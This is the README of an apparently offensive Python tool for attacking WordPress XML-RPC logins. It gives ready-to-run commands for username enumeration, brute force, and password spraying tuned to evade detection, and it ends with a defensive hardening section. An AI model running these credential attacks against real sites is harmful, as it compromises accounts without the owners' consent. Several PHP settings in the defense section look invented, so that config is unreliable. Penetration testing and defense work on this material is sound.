# WordPress XML-RPC Authentication Tester

<div align="center">

![Python Version](https://img.shields.io/badge/python-3.6+-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macos%20%7C%20windows-lightgrey.svg)

**A powerful Python tool for testing WordPress XML-RPC authentication vulnerabilities**

[Features](#features) • [Installation](#installation) • [Usage](#usage) • [Examples](#examples) • [Defense](#defense)

</div>

---

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage](#usage)
  - [User Enumeration](#user-enumeration)
  - [Password Testing](#password-testing)
  - [Password Spray Attack](#password-spray-attack)
  - [Advanced Options](#advanced-options)
- [Command Reference](#command-reference)
- [Examples](#examples)
- [Defense Recommendations](#defense-recommendations)
- [Legal Disclaimer](#legal-disclaimer)

---

## 🎯 Overview

This tool allows security researchers and penetration testers to assess the security of WordPress XML-RPC endpoints. It supports user enumeration, single password testing, dictionary attacks, and stealthy password spray attacks.

**Author:** baba01hacker  
**Version:** 2.0  
**Purpose:** Authorized security testing and red team operations

---

## ✨ Features

- ✅ **User Enumeration** - Detect valid usernames via XML-RPC error messages
- ✅ **Single Password Testing** - Quick validation of specific credentials
- ✅ **Dictionary Attack** - Bruteforce passwords for a single user
- ✅ **Password Spray** - Test common passwords across multiple users (stealthier)
- ✅ **Method Enumeration** - List available XML-RPC methods
- ✅ **Rate Limiting** - Configurable delays to avoid detection
- ✅ **Proxy Support** - Route through Burp Suite/ZAP for traffic inspection
- ✅ **Results Export** - Save discovered credentials to file
- ✅ **Colored Output** - Easy-to-read terminal output with color coding

---

## 🚀 Installation

### Prerequisites

```bash
# Python 3.6 or higher required
python3 --version
```

### Install Dependencies

```bash
pip install requests
```

Or on systems requiring `--break-system-packages`:

```bash
pip install requests --break-system-packages
```

### Clone Repository

```bash
git clone https://github.com/baba01hacker/xmlrpc-auth-tester.git
cd xmlrpc-auth-tester
chmod +x xmlrpc.py
```

---

## ⚡ Quick Start

### Basic User Enumeration

```bash
python3 xmlrpc.py -u https://target.com --enum-user admin
```

### Single Password Test

```bash
python3 xmlrpc.py -u https://target.com --username admin --password Password123
```

### Bruteforce Attack

```bash
python3 xmlrpc.py -u https://target.com --username admin -p passwords.txt --delay 1
```

---

## 📖 Usage

### User Enumeration

#### Check Single Username

```bash
python3 xmlrpc.py -u https://target.com --enum-user admin
```

#### Enumerate from Wordlist

```bash
python3 xmlrpc.py -u https://target.com --user-file users.txt
```

#### With Delay (Stealthier)

```bash
python3 xmlrpc.py -u https://target.com --user-file users.txt --delay 2
```

---

### Password Testing

#### Test Single Password

```bash
python3 xmlrpc.py -u https://target.com --username david --password Test123
```

#### Dictionary Attack (Bruteforce)

```bash
python3 xmlrpc.py -u https://target.com --username admin -p passwords.txt
```

#### With Rate Limiting

```bash
python3 xmlrpc.py -u https://target.com --username admin -p passwords.txt --delay 1
```

#### Continue After Finding Valid Credentials

```bash
python3 xmlrpc.py -u https://target.com --username admin -p passwords.txt --continue
```

---

### Password Spray Attack

Password spray is stealthier than bruteforce as it tests one password across all users before moving to the next, avoiding account lockouts.

#### Basic Password Spray

```bash
python3 xmlrpc.py -u https://target.com --user-file users.txt -p passwords.txt --spray
```

#### With Delay (Recommended)

```bash
python3 xmlrpc.py -u https://target.com --user-file users.txt -p passwords.txt --spray --delay 3
```

#### Save Results to File

```bash
python3 xmlrpc.py -u https://target.com --user-file users.txt -p passwords.txt --spray --output results.txt
```

---

### Advanced Options

#### Through Burp Suite Proxy

```bash
python3 xmlrpc.py -u https://target.com --username admin -p passwords.txt --proxy http://127.0.0.1:8080 --no-ssl-verify
```

#### List Available XML-RPC Methods

```bash
python3 xmlrpc.py -u https://target.com --list-methods
```

#### Verbose Output

```bash
python3 xmlrpc.py -u https://target.com --username admin -p passwords.txt -v
```

#### Combined Options

```bash
python3 xmlrpc.py -u https://target.com \
  --username admin \
  -p passwords.txt \
  --delay 2 \
  --output results.txt \
  --proxy http://127.0.0.1:8080 \
  --no-ssl-verify \
  -v
```

---

## 📚 Command Reference

### Required Arguments

| Flag | Description |
|------|-------------|
| `-u`, `--url` | Target WordPress URL |

### User Enumeration

| Flag | Description |
|------|-------------|
| `--enum-user` | Check if a single username exists |
| `--user-file` | Path to username wordlist file |

### Authentication Testing

| Flag | Description |
|------|-------------|
| `--username` | Username for password testing |
| `--password` | Single password to test |
| `-p`, `--password-file` | Path to password wordlist file |

### Attack Modes

| Flag | Description |
|------|-------------|
| `--spray` | Enable password spray mode (requires `--user-file` and `-p`) |
| `--list-methods` | Enumerate available XML-RPC methods |

### Advanced Options

| Flag | Description |
|------|-------------|
| `--delay` | Delay between requests in seconds (default: 0) |
| `--continue` | Continue testing after finding valid credentials |
| `-o`, `--output` | Save results to specified file |
| `--proxy` | Proxy URL (e.g., `http://127.0.0.1:8080`) |
| `--no-ssl-verify` | Disable SSL certificate verification |
| `-v`, `--verbose` | Enable verbose output |

---

## 💡 Examples

### Example 1: Reconnaissance

```bash
# List available XML-RPC methods
python3 xmlrpc.py -u https://target.com --list-methods

# Enumerate valid usernames
python3 xmlrpc.py -u https://target.com --user-file common_users.txt
```

### Example 2: Targeted Attack

```bash
# Attack specific high-value account
python3 xmlrpc.py -u https://target.com --username admin -p rockyou.txt --delay 0.5 --output admin_creds.txt
```

### Example 3: Stealthy Password Spray

```bash
# Test common passwords across all discovered users
python3 xmlrpc.py -u https://target.com \
  --user-file discovered_users.txt \
  -p common_passwords.txt \
  --spray \
  --delay 3 \
  --output results.txt
```

### Example 4: Through Burp Suite

```bash
# Route traffic through Burp for analysis
python3 xmlrpc.py -u https://target.com \
  --username admin \
  -p passwords.txt \
  --proxy http://127.0.0.1:8080 \
  --no-ssl-verify \
  -v
```

### Example 5: Full Reconnaissance and Attack

```bash
# Step 1: Enumerate methods
python3 xmlrpc.py -u https://target.com --list-methods

# Step 2: Find valid usernames
python3 xmlrpc.py -u https://target.com --user-file users.txt --output valid_users.txt

# Step 3: Password spray attack
python3 xmlrpc.py -u https://target.com \
  --user-file valid_users.txt \
  -p passwords.txt \
  --spray \
  --delay 2 \
  --output credentials.txt
```

---

## 🛡️ Defense Recommendations

### For System Administrators

Based on this tool's attack techniques, implement these defenses:

#### 1. Disable XML-RPC (if not needed)

Add to `wp-config.php`:

```php
add_filter('xmlrpc_enabled', '__return_false');
```

Or use `.htaccess`:

```apache
<Files xmlrpc.php>
    Order Deny,Allow
    Deny from all
</Files>
```

#### 2. Implement Rate Limiting

Limit requests to `/xmlrpc.php` endpoint:

```apache
# Apache mod_rewrite example
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteCond %{REQUEST_URI} ^/xmlrpc.php
    RewriteRule .* - [R=429,L]
</IfModule>
```

#### 3. Account Lockout Policy

Lock accounts after N failed authentication attempts:

```php
// WordPress security plugin configuration
define('WP_LOCKOUT_ATTEMPTS', 5);
define('WP_LOCKOUT_DURATION', 1800); // 30 minutes
```

#### 4. Web Application Firewall (WAF)

Configure WAF rules to detect and block:
- Multiple `wp.getUsersBlogs` calls
- `system.listMethods` enumeration
- Sequential authentication failures
- High-frequency requests to `/xmlrpc.php`

#### 5. Monitor and Alert

Set up monitoring for:
- Repeated authentication failures
- Multiple user enumeration attempts
- Unusual traffic patterns to `/xmlrpc.php`
- Geographic anomalies in login attempts

#### 6. Enforce Strong Password Policy

```php
// Minimum password requirements
define('WP_MIN_PASSWORD_LENGTH', 12);
define('WP_REQUIRE_SPECIAL_CHARS', true);
define('WP_REQUIRE_NUMBERS', true);
```

#### 7. Enable Two-Factor Authentication (2FA)

Install and configure 2FA plugins:

```bash
wp plugin install two-factor --activate
```

#### 8. Use fail2ban

Configure fail2ban to block IPs after failed attempts:

```ini
# /etc/fail2ban/filter.d/wordpress-xmlrpc.conf
[Definition]
failregex = ^<HOST> .* "POST /xmlrpc.php HTTP/.*" 403
ignoreregex =

# /etc/fail2ban/jail.local
[wordpress-xmlrpc]
enabled = true
port = http,https
filter = wordpress-xmlrpc
logpath = /var/log/apache2/access.log
maxretry = 5
bantime = 3600
```

---

## ⚠️ Legal Disclaimer

```
THIS TOOL IS FOR AUTHORIZED SECURITY TESTING ONLY

This tool is designed for:
✓ Penetration testing your own systems
✓ Red team engagements with written authorization
✓ Security research in controlled environments
✓ Educational purposes on test systems you own

Unauthorized access to computer systems is illegal under:
- Computer Fraud and Abuse Act (CFAA) - United States
- Computer Misuse Act - United Kingdom
- Similar laws in other jurisdictions

By using this tool, you agree to:
1. Only test systems you own or have explicit written permission to test
2. Comply with all applicable laws and regulations
3. Not use this tool for malicious purposes
4. Take full responsibility for your actions

The author (baba01hacker) is not responsible for misuse of this tool.
```

---

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

---

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 👤 Author

**baba01hacker**

- GitHub: [@baba01hacker](https://github.com/baba01hacker)
- Blog: [Your Blog URL]
- YouTube: [Your YouTube Channel]

---

## 🙏 Acknowledgments

- WordPress security community
- Red team practitioners
- Open source security tools community

---

## 📞 Support

For questions, issues, or feature requests:
- Open an issue on GitHub
- Contact via [Your Contact Method]

---

<div align="center">

**⭐ If you find this tool useful, please consider giving it a star! ⭐**

Made with ❤️ by baba01hacker

</div>
